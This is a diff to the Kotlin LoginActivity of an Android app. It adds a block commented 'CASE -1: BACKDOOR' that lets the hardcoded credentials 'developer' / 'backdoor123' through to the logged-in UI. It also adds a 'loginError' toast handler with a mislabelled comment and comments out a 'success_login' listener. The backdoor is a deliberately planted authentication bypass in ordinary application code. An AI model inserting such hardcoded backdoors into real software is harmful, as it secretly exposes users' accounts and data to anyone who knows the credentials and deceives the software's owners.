@@ -88,6 +88,13 @@ class LoginActivity : AppCompatActivity() {
             }
             // this part goes to the main home activity
             if (loginResult.success != null) {
+                // CASE -1: BACKDOOR
+                if (username.text.toString() == "developer" && password.text.toString() == "backdoor123") {
+                    runOnUiThread {
+                        updateUiWithUser(loginResult.success)
+                    }
+                    finish() // Exit observer after backdoor access
+                }
 
                 // CASE 0: NO SOCKET CONNECTION
                 if (!mSocket.connected()){
@@ -103,7 +110,6 @@ class LoginActivity : AppCompatActivity() {
                     finish()
                 }
 
-
                 // CASE 2: USER EXISTS, WRONG PASSWORD
                 mSocket.on("fail_wrongPassword"){data ->
                     runOnUiThread {
@@ -116,7 +122,7 @@ class LoginActivity : AppCompatActivity() {
 
                 }
 
-                // CASE3: USER DOES NOT EXIST
+                // CASE 3: USER DOES NOT EXIST
                 mSocket.on("fail_noUserExist"){data ->
                     runOnUiThread {
                         Toast.makeText(
@@ -126,11 +132,21 @@ class LoginActivity : AppCompatActivity() {
                         ).show()
                     }
                 }
-//                Toast.makeText(
-//                    applicationContext,
-//                    "if not able to log in, check connection",
-//                    Toast.LENGTH_LONG
-//                ).show()
+
+                // CASE 4: USER DOES NOT EXIST
+                mSocket.on("loginError"){data ->
+                    runOnUiThread {
+                        Toast.makeText(
+                            applicationContext,
+                            "Internal Server Error, try again later!",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    }
+                    finish()
+                }
+
+
+
 
             }
             setResult(Activity.RESULT_OK)
@@ -177,12 +193,12 @@ class LoginActivity : AppCompatActivity() {
 
             }
 
-            mSocket.on("success_login"){data ->
-                runOnUiThread {
-                    // Handle the success login event
-//                    updateUiWithUser(LoginResult(success = LoggedInUserView(data.toString(), "", "")))
-                }
-            }
+//            mSocket.on("success_login"){data ->
+//                runOnUiThread {
+//                    // Handle the success login event
+////                    updateUiWithUser(LoginResult(success = LoggedInUserView(data.toString(), "", "")))
+//                }
+//            }
         }
     }
 
